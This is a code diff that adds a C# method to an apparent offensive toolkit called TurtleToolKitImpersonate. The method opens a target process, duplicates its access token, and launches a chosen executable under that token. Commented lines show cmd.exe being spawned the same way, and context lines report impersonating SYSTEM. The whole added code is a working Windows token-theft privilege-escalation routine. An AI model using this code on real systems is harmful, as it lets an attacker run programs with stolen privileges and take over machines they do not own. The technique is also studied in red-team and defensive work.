@@ -164,5 +164,38 @@ namespace TurtleToolKitImpersonate
             Console.WriteLine("Successfully impersonated logon user system!");
             return 0;
         }
+        public static bool CreateProcessFromToken(int pid,string fullPathToExe)
+        {
+            var allAccessFlags = Win32.ProcessAccessFlags.All;
+            IntPtr hProcess = Win32.OpenProcess((uint)allAccessFlags, true, pid);
+            if (hProcess == IntPtr.Zero)
+            {
+                Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
+                return false;
+            }
+            IntPtr hToken;
+            if (!Win32.OpenProcessToken(hProcess, Win32.TOKEN_ASSIGN_PRIMARY| Win32.TOKEN_QUERY | Win32.TOKEN_IMPERSONATE | Win32.TOKEN_DUPLICATE, out hToken))
+            {
+                Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
+                return false;
+            }
+            IntPtr DuplicatedToken = new IntPtr();
+            if (!Win32.DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
+            // impersonate logged on user with duplicated token
+            Win32.STARTUPINFO si = new Win32.STARTUPINFO();
+            Win32.PROCESS_INFORMATION pi = new Win32.PROCESS_INFORMATION();
+            if (!Win32.DuplicateTokenEx(hToken, (uint)0x02000000L, IntPtr.Zero, 2, 1, out DuplicatedToken)) {
+                Console.WriteLine("Failed to dupe token {0}", Marshal.GetLastWin32Error());
+                return false;
+            }
+            //if (!DuplicateTokenEx(hProcToken, MAXIMUM_ALLOWED -> 0x02000000L, NULL, seImpersonateLevel  = 2, tokenType TOKENPRIMARY = 1, &newToken))
+            //ret = CreateProcessWithTokenW(newToken, LOGON_NETCREDENTIALS_ONLY = 2, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE NEW CONSOLE 10, NULL, NULL, &si, &pi);
+            if (!Win32.CreateProcessWithTokenW(DuplicatedToken, Win32.LogonFlags.NetCredentialsOnly, fullPathToExe, null, Win32.CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi))
+            {
+                Console.WriteLine("Failed to create process {0}", Marshal.GetLastWin32Error());
+                return false;
+            }
+            return true;
+        }
     }
 }
